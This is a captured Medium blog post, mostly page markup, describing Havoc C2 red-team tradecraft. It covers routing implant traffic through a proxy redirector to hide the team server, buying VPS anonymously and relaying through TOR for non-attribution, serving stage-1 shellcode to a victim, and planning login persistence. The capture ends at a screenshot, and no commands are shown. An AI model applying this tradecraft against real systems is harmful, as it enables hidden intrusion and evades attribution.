# https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a

<!DOCTYPE html><html lang="en" data-rh="lang" dir="ltr"><body><div id="root"><div class="a b c"><a href="https://medium.com/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" rel="noopener follow" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="m"><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="sn" role="dialog" aria-modal="true" tabindex="-1"><div class="xs xt bi ed xu xv xw aq xx hd xy" aria-hidden="true" role="presentation"></div><div class="xz xu ya yb yc xs ed fk yd ye yf mb yg yh yi yj yk yl ym yn yo yp ac cv yq" aria-hidden="true"><div class="yr gy"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="gl gm gn go gp m"><div class="ac ci"><div class="cp bi gq gr gs gt"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw gz ys hb hc hd"></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><div><h1 id="1fdd" class="pw-post-title hj hk hl bg hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih bl" data-testid="storyTitle" data-selectable-paragraph="">Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 2)</h1></div><div><h2 id="a4fb" class="pw-subtitle-paragraph ii hk hl bg b ij ik il im in io ip iq ir is it iu iv iw ix cx eb" data-selectable-paragraph="">DISCLAIMER: Using these tools and methods against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using these tools and methods.</h2><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac iy iz ja jb jc jd je jf jg jh ji"><div class="ac r ji"><div class="ac jj"><div><div class="bn" aria-describedby="3" aria-labelledby="3" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---byline--d3ac83589e3a---------------------------------------" data-discover="true"><div class="m jk jl by jm jn"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="jo by m bz ca fw o jp gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="jq ac r"><div class="ac r jr"><div class="ac r"><div><div class="bn" aria-describedby="4" aria-labelledby="4" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at js" data-testid="authorName" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---byline--d3ac83589e3a---------------------------------------" data-discover="true">Sam Rothlisberger</a></span></div></div></div></div><div class="jt bn"></div><button class="vf zl aq ac ci r zm zn zo" style="border: 1px solid rgb(36, 36, 36);"><span class="bg b bh ab bl bi"><span class="bn zp">Follow</span></span></button></div></div></span></div><div class="ac r ju"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">9 min read</span><div class="jv jw m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">Feb 3, 2024</span></div></span></div></div><div class="ac cw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km"><div class="i l x fp fq r"><div class="lc m"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fd3ac83589e3a&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&amp;user=Sam+Rothlisberger&amp;userId=f215b9cd90cb&amp;source=---header_actions--d3ac83589e3a---------------------clap_footer------------------" data-discover="true"><div><div class="bn" aria-describedby="5" aria-labelledby="5" role="tooltip"><div tabindex="-1" class="bf"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><div><div class="bn" aria-describedby="65" aria-labelledby="65" role="tooltip"><div tabindex="-1" class="bf"><p class="bg b ec ab eb"><button class="ah ai aj fo al am an ao ap aq ar as at au av zq mg">291<span class="m i h g ss st"></span></button></p></div></div></div></div></div></div><div><div class="bn" aria-describedby="6" aria-labelledby="6" role="tooltip"><div tabindex="-1" class="bf"><button class="aq lj mb mc ac r fs md me" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ma"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bg b ec ab eb"><span class="pw-responses-count lz ma">1</span></p></button></div></div></div></div><div class="ac r kn ko kp kq kr ks kt ku kv kw kx ky kz la lb"><div class="mf l k j e"></div><div class="i l"><div><div class="bn" aria-describedby="7" aria-labelledby="7" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fd3ac83589e3a&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&amp;source=---header_actions--d3ac83589e3a---------------------bookmark_footer------------------" data-discover="true"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb mg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk mh cu"><div class="m ag"><div class="ac ci"><div class="mi mj mk ml mm mn cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dd3ac83589e3a&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&amp;source=---header_actions--d3ac83589e3a---------------------post_audio_button------------------" data-discover="true"><div><div class="bn" aria-describedby="54" aria-labelledby="54" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr ms mt mu mv t mw mx my mz na nb nc v nd ne nf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-describedby="9" aria-labelledby="9" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr ms mt mu mv t mw mx my mz na nb nc v nd ne nf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><p id="527a" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">This post is a continuation of part 1 where we successfully executed a Havoc C2 reverse shell via DLL hijacking with AV enabled. Now we’re going to do acouple more things to make our exploit more complete:</p><ul class=""><li id="41b7" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe bl" data-selectable-paragraph="">Use a redirector server to hide the true location of our Team Server (command and control server) via port forwarding</li><li id="9c3a" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Put the executable and DLL in a normal program file folder and start on user login to achieve persistence</li></ul><h3 id="15b7" class="ok ol hl bg om on oo ef op oq or eh os np ot ou ov nt ow ox oy nx oz pa pb pc bl" data-selectable-paragraph="">Hiding the Location of our Havoc Team Server</h3><p id="d883" class="pw-post-body-paragraph ng nh hl ni b ij pd nk nl im pe nn no np pf nr ns nt pg nv nw nx ph nz oa ob he bl" data-selectable-paragraph="">The first thing we need to do is hide the true location of the C2 server. Basically, we will have a proxy machine that forwards everything to our command-and-control server. This is done to change your country of origin, hide your name if you purchase a robust and long-lasting C&amp;C server with a debit/credit card, protect infrastructure long term, and ultimately maintain deniability and non-attribution. There are ways to purchase VPS infrastructure anonymously and with little financial investment. You can also use more than one proxy or simply relay your connection through the TOR network from your initial proxy. Here’s how to run a kali linux headless instance on DigitalOcean for our proxy server if you want to learn how. It’s only about $6 a month.</p><div class="pi pj pk pl pm pn"><a href="https://www.kali.org/docs/cloud/digitalocean/?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="po ac cb"><div class="pp ac cv ci cd pq"><h2 class="bg hm pr ab ga ps pt pu pv pw px hk bl">Digital Ocean | Kali Linux Documentation</h2><div class="py m"><h3 class="bg b pr ab ga ps pt pu pv pw px eb">DigitalOcean is a cloud provider similar to AWS, Microsoft Azure, Google Cloud Platform, and many others. They offer…</h3></div><div class="pz m"><p class="bg b ec ab ga ps pt pu pv pw px eb">www.kali.org</p></div></div><div class="qa m"><div class="wa m qc qd qe qa qf mn pn"></div></div></div></a></div><p id="7bc0" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">The Team Server and client are going to be running on the C&amp;C server. The only thing we are running on the proxy server is port forwarding from the victim host to C&amp;C server. In our case, we will forward everything to/from port 8443, 80, and 443 on the proxy server to/from port 50000, 50001, and 50002 on the C&amp;C server, respectively.</p><blockquote class="qg qh qi"><p id="913a" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Victim host → Proxy (DigitalOcean droplet w/ public IP) server → C&amp;C server</p></blockquote><p id="ca36" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Because of this, we need to change some addresses in our exploit from part 1 of this post:</p><p id="feec" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 1) </strong>Victim downloads iloveblogs.bin shellcode (stage 1) from proxy server over port 80 and loads it into memory. Behind the scenes our iloveblogs.bin shellcode is actually loaded from our C&amp;C server on port 50000 and sent to the proxy. We need to generate a new iloveblogs.bin with the proxy server public IP so when stage 1 is executed, it knows to connect to the proxy host public IP:</p></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr qs"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*mw198RZs3nlfhzttcJ9UYA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*mw198RZs3nlfhzttcJ9UYA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mw198RZs3nlfhzttcJ9UYA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mw198RZs3nlfhzttcJ9UYA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mw198RZs3nlfhzttcJ9UYA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mw198RZs3nlfhzttcJ9UYA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mw198RZs3nlfhzttcJ9UYA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*mw198RZs3nlfhzttcJ9UYA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="120" loading="eager" role="presentation" 